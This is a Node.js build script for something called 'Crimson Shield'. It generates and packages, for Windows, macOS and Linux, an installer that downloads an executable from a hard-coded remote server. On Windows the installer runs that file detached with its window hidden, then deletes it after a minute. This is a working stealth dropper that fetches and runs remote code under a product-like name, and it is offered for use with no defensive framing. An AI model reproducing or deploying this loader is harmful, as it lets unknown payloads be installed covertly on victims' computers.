const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

console.log('╔═══════════════════════════════════════════╗');
console.log('║     🔨 CRIMSON SHIELD BUILDER            ║');
console.log('╠═══════════════════════════════════════════╣');
console.log('║  Building for ALL platforms...           ║');
console.log('╚═══════════════════════════════════════════╝');

// ===== CREATE INSTALLER.JS =====
const installerScript = `
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const os = require('os');

const SERVER_URL = 'https://crimson-production-d9ad.up.railway.app';

function detectSystem() {
    const platform = process.platform;
    const arch = os.arch();
    
    if (platform === 'win32') {
        if (arch === 'x64') return { os: 'win', arch: 'x64', ext: '.exe' };
        if (arch === 'ia32') return { os: 'win', arch: 'x86', ext: '.exe' };
        if (arch === 'arm64') return { os: 'win', arch: 'arm64', ext: '.exe' };
        return { os: 'win', arch: 'x64', ext: '.exe' };
    }
    if (platform === 'darwin') return { os: 'mac', arch: 'x64', ext: '' };
    if (platform === 'linux') return { os: 'linux', arch: 'x64', ext: '' };
    return { os: 'win', arch: 'x64', ext: '.exe' };
}

function downloadAndRun() {
    const system = detectSystem();
    let filename;
    if (system.os === 'win') {
        filename = \`CrimsonShield_\${system.arch}.exe\`;
    } else if (system.os === 'mac') {
        filename = 'CrimsonShield_mac';
    } else {
        filename = 'CrimsonShield_linux';
    }
    
    const fallbackFilename = 'CrimsonShield_x64.exe';
    const tempPath = path.join(os.tmpdir(), filename);
    const url = \`\${SERVER_URL}/download/\${filename}\`;
    const fallbackUrl = \`\${SERVER_URL}/download/\${fallbackFilename}\`;
    
    console.log(\`📥 Downloading: \${filename}\`);
    
    https.get(url, (response) => {
        if (response.statusCode === 404) {
            console.log(\`⚠️ Version not found, using fallback...\`);
            downloadFallback(fallbackUrl, tempPath);
            return;
        }
        let data = [];
        response.on('data', (chunk) => data.push(chunk));
        response.on('end', () => {
            const buffer = Buffer.concat(data);
            fs.writeFileSync(tempPath, buffer);
            console.log(\`✅ Downloaded: \${filename}\`);
            runFile(tempPath);
        });
    }).on('error', (err) => {
        console.error(\`❌ Download failed: \${err.message}\`);
        downloadFallback(fallbackUrl, tempPath);
    });
}

function downloadFallback(url, tempPath) {
    https.get(url, (response) => {
        if (response.statusCode === 404) {
            console.error('❌ Fallback also failed!');
            return;
        }
        let data = [];
        response.on('data', (chunk) => data.push(chunk));
        response.on('end', () => {
            const buffer = Buffer.concat(data);
            fs.writeFileSync(tempPath, buffer);
            console.log(\`✅ Downloaded fallback\`);
            runFile(tempPath);
        });
    });
}

function runFile(filePath) {
    console.log(\`🚀 Running: \${filePath}\`);
    if (process.platform === 'win32') {
        try {
            const child = spawn(filePath, [], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
                shell: true
            });
            child.unref();
            console.log('✅ Launched successfully!');
        } catch (e) {
            try {
                exec(\`start /b "" "\${filePath}"\`);
                console.log('✅ Launched via cmd!');
            } catch(e2) {}
        }
    }
    setTimeout(() => {
        try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
    }, 60000);
}

downloadAndRun();
`;

// Write installer.js
fs.writeFileSync(path.join(__dirname, 'installer.js'), installerScript);
console.log('✅ installer.js created');

// ===== BUILD ALL VERSIONS =====
console.log('\n📦 Building all versions...\n');

const builds = [
    { target: 'node18-win-x64', output: 'CrimsonShield_x64.exe' },
    { target: 'node18-win-x86', output: 'CrimsonShield_x86.exe' },
    { target: 'node18-win-arm64', output: 'CrimsonShield_arm64.exe' },
    { target: 'node18-macos-x64', output: 'CrimsonShield_mac' },
    { target: 'node18-linux-x64', output: 'CrimsonShield_linux' }
];

let completed = 0;

builds.forEach((build, index) => {
    console.log(`[${index + 1}/${builds.length}] Building: ${build.output}`);
    
    const cmd = `pkg installer.js --target ${build.target} --output ${build.output}`;
    
    exec(cmd, (error, stdout, stderr) => {
        completed++;
        if (error) {
            console.log(`❌ Failed: ${build.output}`);
            console.log(`   ${error.message}`);
        } else {
            console.log(`✅ Built: ${build.output}`);
        }
        
        if (completed === builds.length) {
            console.log('\n╔═══════════════════════════════════════════╗');
            console.log('║     ✅ ALL BUILDS COMPLETE!              ║');
            console.log('╠═══════════════════════════════════════════╣');
            console.log('║  Files built:                            ║');
            builds.forEach(b => {
                const exists = fs.existsSync(path.join(__dirname, b.output));
                console.log(`║  ${exists ? '✅' : '❌'} ${b.output.padEnd(25)}║`);
            });
            console.log('╚═══════════════════════════════════════════╝');
            console.log('\n📋 Upload these files to your server!');
        }
    });
});
